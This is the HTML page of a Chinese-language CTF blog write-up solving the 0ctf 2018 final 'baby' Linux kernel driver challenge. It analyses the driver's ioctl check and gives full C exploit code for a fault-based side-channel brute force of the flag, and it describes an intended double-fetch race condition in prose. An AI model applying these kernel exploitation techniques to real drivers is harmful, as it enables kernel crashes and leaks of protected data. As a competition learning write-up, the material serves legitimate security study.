@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="P4nda" />
+
+
+
+<meta name="description" content="这个比赛也过去好久了，比赛的时候没有去线下赛，只能赛后复现一下。拿这道题来作为入门的第二道KERNEL PWN吧...">
+<meta name="keywords" content="KERNEL,PWN,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【kernel pwn】0ctf 2018 final baby题解">
+<meta property="og:url" content="http://p4nda.top/2018/07/20/0ctf-baby/index.html">
+<meta property="og:site_name" content="p4nda&#39;s blog">
+<meta property="og:description" content="这个比赛也过去好久了，比赛的时候没有去线下赛，只能赛后复现一下。拿这道题来作为入门的第二道KERNEL PWN吧...">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://p4nda.top/img/0ctf-babyko/1-1.png">
+<meta property="og:image" content="http://p4nda.top/img/0ctf-babyko/2-1.png">
+<meta property="og:image" content="http://p4nda.top/img/0ctf-babyko/2-2.png">
+<meta property="og:image" content="http://p4nda.top/img/0ctf-babyko/0.png">
+<meta property="og:updated_time" content="2018-07-23T04:10:16.549Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【kernel pwn】0ctf 2018 final baby题解">
+<meta name="twitter:description" content="这个比赛也过去好久了，比赛的时候没有去线下赛，只能赛后复现一下。拿这道题来作为入门的第二道KERNEL PWN吧...">
+<meta name="twitter:image" content="http://p4nda.top/img/0ctf-babyko/1-1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="p4nda&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/p4nda.jpeg">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>【kernel pwn】0ctf 2018 final baby题解 | p4nda&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?11859a78d84a58f3a5bac3d2ec5ea89e";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/p4nda.jpeg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">P4nda</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:root@p4nda.xyz" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/ret2p4nda" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
+                            
+                                <a class="fa 博客园" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
+                            
+                                <a class="fa QQ" href="/381124487" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNABLE-TW/">PWNABLE.TW</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Questions/">Questions</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://0gur1.cc">0gur1</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://tacxingxing.com">Tac1t0rnX</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://veritas501.space/">Veritas501</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://p1umer.club/">p1umer</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="//p4nda.top/WooyunDrops/">Wooyun知识库</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">PWNer of Dubhe | PWN &amp; security | byr</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">P4nda</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/p4nda.jpeg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">P4nda</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:root@p4nda.xyz" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/ret2p4nda" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
+                            
+                                <a class="fa 博客园" target="_blank" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/381124487" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-0ctf-baby" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/07/20/0ctf-baby/" class="article-date">
+      <time datetime="2018-07-20T10:39:12.000Z" itemprop="datePublished">2018-07-20</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      【kernel pwn】0ctf 2018 final baby题解
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><a href="https://pan.baidu.com/s/1s_lqbRZdPsAcp2qm52A-kw" target="_blank" rel="noopener">题目及相关下载</a> 密码:<strong><em>fant</em></strong></p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>题目代码很简单，仅注册了ioctl函数，里面包含了两个case，在参数为0x6666时，可以泄露出bss段flag的地址。</p>
+<p>在参数为0x1337时，用户输入是一个结构体，而传入驱动的是一个指针。</p>
+<p>这个结构体应该是这样的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">input</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> *flag;</span><br><span class="line">	<span class="keyword">size_t</span> len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>对这个结构体指针进行一系列判断以后，会比较结构体中的flag指针指向的内容和长度，当比较的用户输入长度和内容都是flag时，使用printk打印flag内容。</p>
+<p><img src="/img/0ctf-babyko/1-1.png" alt=""></p>
+<p>仔细查看一下_chk_range_not_ok，看类C代码看不出什么意思，查看一下汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000000 __chk_range_not_ok proc near            ; CODE XREF: baby_ioctl+7B↓p</span><br><span class="line">.text:0000000000000000                                         ; baby_ioctl+BD↓p</span><br><span class="line">.text:0000000000000000                 push    rbp</span><br><span class="line">.text:0000000000000001                 add     rdi, rsi</span><br><span class="line">.text:0000000000000004                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000007                 jb      short loc_11</span><br><span class="line">.text:0000000000000009                 cmp     rdx, rdi</span><br><span class="line">.text:000000000000000C                 setb    al</span><br><span class="line">.text:000000000000000F                 pop     rbp</span><br><span class="line">.text:0000000000000010                 retn</span><br><span class="line">.text:0000000000000011 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000011</span><br><span class="line">.text:0000000000000011 loc_11:                                 ; CODE XREF: __chk_range_not_ok+7↑j</span><br><span class="line">.text:0000000000000011                 mov     eax, 1</span><br><span class="line">.text:0000000000000016                 pop     rbp</span><br><span class="line">.text:0000000000000017                 retn</span><br><span class="line">.text:0000000000000017 __chk_range_not_ok endp</span><br></pre></td></tr></table></figure>
+<p>可以看出，是将第一个参数和第二个参数相加，判断是否小于第三个参数，如果不小于将al置为1。</p>
+<p>在动态调试的时候，发现第三个参数是一个常量： 0x7ffffffff000</p>
+<p>这样的话，题目就很清楚了。判断的限制是传入的结构体+16，也就是整个结构体要在用户态中，并且结构体中第一个成员所指向的内存也要在用户态中。并且第二个参数要和bss段上的flag长度相等。这样会逐字节比较输入的flag是否等于bss保存的flag。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>和libc的pwn题不太一样，内核驱动的pwn需要驱动在一个版本的内核代码下编译，否则无法运行。</p>
+<p><img src="/img/0ctf-babyko/2-1.png" alt=""></p>
+<p>在程序代码中可以看到一个内核版本号——4.15.0-22-generic SMP mod_unload，我从官网源代码下载的版本只有4.15.0而没有-22的小版本。</p>
+<p>此时，可以通过下载相应的内核deb包。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt download linux-image-4.15.0-22-generic</span><br></pre></td></tr></table></figure>
+<p>下载得到的linux-image-4.15.0-22-generic_4.15.0-22.24~16.04.1_amd64.deb中data.tar.xz下的boot中可以找到一个叫vmlinuz-4.15.0-22-generic的文件，这就是需要的内核映像。</p>
+<p>此处需要明确文件的区别        <strong><em>//一定是我太菜才不知道</em></strong></p>
+<p>vmlinux：这个是编译出来原始的内核，未经过压缩，<strong>不能直接通过qemu启动</strong>，是一个ELF文件，里面包括了符号表等等一系列内核相关的指令，可以用IDA Pro查看，可以找gadget等等等等。类比于libc pwn中的libc-2.23.so之类的，给了这个东西就可以找gadget、找地址偏移等等。</p>
+<p>bzImage：这个是vmlinux压缩以后，并且加上一段解压启动代码得到。这个东西可以放到QEMU中跑，但是不能用IDA打开。</p>
+<p>*.cpio：这个东西一般都是打包生成的，最开始是从busybox中导出来的，类似于启动的文件系统吧（？）一般kernel pwn会在这里放*.ko。甚至放vmlinux…</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>环境搭建起来了，就可以看一下漏洞如何利用了。比赛中出现了两种解题方法，一种是预期解，另外一种是侧信道攻击。</p>
+<h2 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h2><p>所谓侧信道攻击就是用能标明flag内容的方法，通过其他表现形式把flag爆破出来。</p>
+<p>在程序中存在一个问题，就是在比较之前没有判断用户输入的flag段是否可读的，当输入的flag处于不可读段的时候，在比较时会触发段错误，从而造成kernel panic，利用这种现象可以用一下方法每次爆破一个字节的flag。</p>
+<p>方法原理如下，利用mmap新建3个段，第一个、第三个权限设为000，第二可读写，并且每次将已有的flag防止在第二个段的最后，每次最后一个字节时爆破的字节，当这个字节和flag不符合时，内核驱动会退出，因此不触发错误。而当最后一个字节正确时，程序比较会下移一个字节，触发错误，引起kernel panic，从而可以判断出单字节的flag，原理如下：</p>
+<p>+—————————————+</p>
+<p>|                                                |</p>
+<p>|             不可读写                    |</p>
+<p>+—————————————+</p>
+<p>|                                                |</p>
+<p>|                                       flag{?|</p>
+<p>+—————————————+</p>
+<p>|                                                |</p>
+<p>|             不可读写                    |</p>
+<p>+—————————————+</p>
+<p>这样测试33次就可以得到flag了。</p>
+<p><img src="/img/0ctf-babyko/2-2.png" alt=""></p>
+<p>EXP</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// start.c </span></span><br><span class="line"><span class="comment">// for start pwn.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *ch = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%%&amp;\\'()*+,-./:;&lt;=&gt;?@[]^_`&#123;|&#125;~"</span>;</span><br><span class="line">	<span class="keyword">char</span> input[<span class="number">34</span>]= &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> order[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">char</span> order2[<span class="number">0x100</span>];</span><br><span class="line">	FILE * fd = fopen(<span class="string">"save.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line">	<span class="built_in">fscanf</span>(fd,<span class="string">"%s"</span>,input);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i&lt;<span class="built_in">strlen</span>(ch);i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> (ch[i] == <span class="string">'\"'</span> ||  ch[i] == <span class="string">'\\'</span> || ch[i] == <span class="string">'`'</span> )&#123;</span><br><span class="line">			<span class="built_in">sprintf</span>(order,<span class="string">"echo \"%s\\%c\" &gt; save.txt"</span>,input,ch[i]);</span><br><span class="line">			<span class="built_in">sprintf</span>(order2,<span class="string">"./pwn %s\\%c"</span>,input,ch[i] );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">sprintf</span>(order,<span class="string">"echo \"%s%c\" &gt; save.txt"</span>,input,ch[i]);</span><br><span class="line">		<span class="built_in">sprintf</span>(order2,<span class="string">"./pwn %s%c"</span>,input,ch[i] );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,order2);</span><br><span class="line">		system(order);</span><br><span class="line">		system(order2);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//strcpy(order,"echo \"");</span></span><br><span class="line">		<span class="comment">//strcpy</span></span><br><span class="line">		<span class="comment">//system("")</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------------------*/</span></span><br><span class="line"><span class="comment">// pwn.c</span></span><br><span class="line"><span class="comment">// test per round</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">input</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> *flag;</span><br><span class="line">	<span class="keyword">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i , fd;</span><br><span class="line">	<span class="keyword">char</span> *buf;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">input</span> <span class="title">input</span> ;</span>  </span><br><span class="line">	<span class="keyword">if</span> (argc!=<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"argc error"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; input : %s len: %d \n"</span>,argv[<span class="number">1</span>],<span class="built_in">strlen</span>(argv[<span class="number">1</span>]));</span><br><span class="line">	mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	buf = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(buf&gt;<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; get a memeroy: %p\n"</span>,buf);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span> ; i&lt;<span class="built_in">strlen</span>(argv[<span class="number">1</span>]);i++)&#123;</span><br><span class="line">		buf[<span class="number">0x1000</span> - <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + i] = argv[<span class="number">1</span>][i];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; addr: %p content: %c \n"</span>, &amp;buf[<span class="number">0x1000</span> - <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + i], argv[<span class="number">1</span>][i] );</span><br><span class="line">	&#125;</span><br><span class="line">	fd = open(<span class="string">"/dev/baby"</span>,O_RDWR);</span><br><span class="line">	<span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"cannot open /dev/baby\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; fd of /dev/baby: %d\n"</span>,fd);</span><br><span class="line">	((struct _input * )buf)-&gt;len = <span class="number">33</span>;</span><br><span class="line">	((struct _input * )buf)-&gt;flag = (buf+<span class="number">0x1000</span>-<span class="built_in">strlen</span>(argv[<span class="number">1</span>]));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; input: %p\n"</span>,input.flag);	</span><br><span class="line">	ioctl(fd,<span class="number">0x1337</span>,buf);</span><br><span class="line">	close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>预期解的漏洞叫做double fetch漏洞，应该算是一种竞争条件漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Serna[ Serna, F. J. MS08-61:thecaseofthekernelmodedoublefetch,2008.https://blogs.technet.microsoft.com/srd/2008/10/14/ms08-061-the-case-of-the-kernel-mode-double-fetch/.]</span><br><span class="line">用户通常会通过调用内核函数完成特定功能，当内核函数两次从同一用户内存地址读取同一数据时，通常第一次读取用来验证数据或建立联系，第二次则用来使用该数据。与此同时，用户空间并发运行的恶意线程可以在两次内核读取操作之间，利用竞争条件对该数据进行篡改，从而造成内核使用数据的不一致。Double fetch漏洞可造成包括缓冲区溢出、信息泄露、空指针引用等后果，最终造成内核崩溃或者恶意提权。</span><br></pre></td></tr></table></figure>
+<p>也就是说，参数是从用户态传进来的，当用户态对传入的结构体改变时，内核读到的数据也会被改变。</p>
+<p>因此，在用户态新建一个线程不断的修改传入的结构体中flag指针为内核flag的值。当驱动运行时，恰好通过地址验证后，在数据判断之前内核数据flag地址被改掉的话，则可以做到通过内容验证，从而打印出flag内容。</p>
+<p>printk输出的内容可以用dmesg来查看。</p>
+<p>此处有个坑点，是QEMU默认启动时会使用当个core、单个thread，这样内核相当于是单进程的。</p>
+<p>而单进程的内核很难触发这个漏洞，因此需要在QEMU启动时设置好内核和进程数如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-m 256M -smp 2,cores=2,threads=1  \</span><br></pre></td></tr></table></figure>
+<p>这个问题坑了我好久，此处非常感谢<a href="https://veritas501.space/" target="_blank" rel="noopener">Veritas501师傅</a>。</p>
+<p>具体EXP，<a href="https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/" target="_blank" rel="noopener">Veritas501师傅的文章</a>写的很好了，我没有什么创新点就不写了。</p>
+<p><img src="/img/0ctf-babyko/0.png" alt=""></p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/" target="_blank" rel="noopener">https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/</a></p>
+<p><a href="https://www.secspace.com/view-ff3bbe863b544a929f96110e7b8992c8-e5cf621eacdb49b3b35b71a20e0ce9be.html" target="_blank" rel="noopener">https://www.secspace.com/view-ff3bbe863b544a929f96110e7b8992c8-e5cf621eacdb49b3b35b71a20e0ce9be.html</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/07/20/0ctf-baby/">【kernel pwn】0ctf 2018 final baby题解</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
+        <p><span>发布时间:</span>2018-07-20, 18:39:12</p>
+        <p><span>最后更新:</span>2018-07-23, 12:10:16</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/07/20/0ctf-baby/" title="【kernel pwn】0ctf 2018 final baby题解">http://p4nda.top/2018/07/20/0ctf-baby/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2018/07/20/0ctf-baby/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/07/13/ciscn2018-core/">
+                    【kernel pwn】CISCN 2018 CTF core题解
+                </a>
+            </div>
+        
+    </nav>
+
